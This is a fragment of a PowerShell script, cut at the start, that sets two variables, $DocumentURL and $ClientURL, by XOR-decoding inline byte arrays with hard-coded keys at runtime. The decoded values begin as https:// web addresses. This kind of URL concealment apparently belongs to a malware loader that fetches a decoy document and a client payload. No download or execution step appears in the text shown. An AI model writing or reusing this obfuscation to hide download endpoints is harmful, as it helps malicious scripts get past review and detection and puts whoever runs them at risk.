...
$DocumentURL    = $($k3758='H2o9JT@lyl';$b=[byte[]](0x20,0x46,0x1B,0x49,0x39,0x6E,0x6F,0x43,0x0B,0x0D,0x3F,0x1C,0x08,0x50,0x3E,0x3C,0x35,0x0E,0x0C,0x1F,0x2D,0x40,0x0C,0x56,0x24,0x20,0x25,0x02,0x0D,0x42,0x2B,0x5D,0x02,0x16,0x39,0x20,0x2F,0x0F,0x12,0x00,0x2D,0x4B,0x5E,0x0B,0x65,0x23,0x29,0x1E,0x1C,0x41,0x2C,0x5D,0x0C,0x4A,0x65,0x39,0x21,0x05,0x17,0x43,0x3F,0x5B,0x1D,0x5C,0x15,0x37,0x2F,0x02,0x1F,0x05,0x3A,0x5F,0x0E,0x4D,0x23,0x3B,0x2E,0x42,0x09,0x08,0x2E);$kb=[System.Text.Encoding]::UTF8.GetBytes($k3758);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
$ClientURL      = $($k3710='mMK+0Grhihez';$b=[byte[]](0x05,0x39,0x3F,0x5B,0x0A,0x68,0x5D,0x1F,0x1E,0x1F,0x4B,0x1E,0x0C,0x3E,0x23,0x49,0x5F,0x26,0x00,0x0C,0x06,0x06,0x15,0x1B,0x1D,0x28,0x39,0x58,0x55,0x24,0x5C,0x1C,0x06,0x18,0x4A,0x38,0x04,0x23,0x64,0x78,0x53,0x35,0x17,0x0D,0x07,0x2B,0x0A,0x14,0x03,0x28,0x28,0x5F,0x1E,0x04,0x1E,0x01,0x0C,0x06,0x11,0x29,0x08,0x39,0x3E,0x5B,0x1E,0x2A,0x01,0x01,0x56,0x0D,0x58,0x3B,0x0E,0x2E,0x2E,0x58,0x43,0x61,0x0B,0x55,0x2E,0x1D,0x00,0x09,0x19);$kb=[System.Text.Encoding]::UTF8.GetBytes($k3710);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
